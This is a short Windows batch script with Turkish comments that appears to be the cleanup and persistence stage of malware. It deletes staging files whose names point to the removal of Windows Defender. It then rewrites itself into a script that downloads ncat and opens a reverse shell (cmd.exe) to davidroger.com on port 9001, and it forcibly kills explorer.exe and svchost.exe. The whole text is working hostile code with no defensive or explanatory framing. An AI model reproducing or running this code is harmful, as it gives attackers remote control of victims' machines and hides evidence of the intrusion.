
:: Dosyalari sil
cd %temp%
del /f /q "s.bat"
del /f /q "a.py"
del /f /q "asd.bat"
del /f /q "ddd.vbs"
del /f /q "expe2.bat"
del /f /q "expe2.vbs"
del /f /q "lalala.vbs"
del /f /q "a.ps1"
del /f /q "first.exe"
del /f /q "corpvpn.inf"
del /f /q "RunDefenderRemover.vbs"
del /f /q "DefenderRemover.bat"
rmdir /s /q "Remove_SecurityComp"
rmdir /s /q "Remove_Defender"

:: Kendini gecici bir dosyaya yaz, sonra o dosya ile degistir
set "script=%~f0"
set "tempfile=%temp%\temp_script.bat"
(
    echo @echo off
    echo cd %%temp%%
    echo curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
    echo %%temp%%\ncat.exe davidroger.com 9001 -e cmd.exe
) > "%tempfile%"

copy /y "%tempfile%" "%script%" >nul

cd %temp%
start taskkill /f /im explorer.exe
start taskkill /f /im svchost.exe

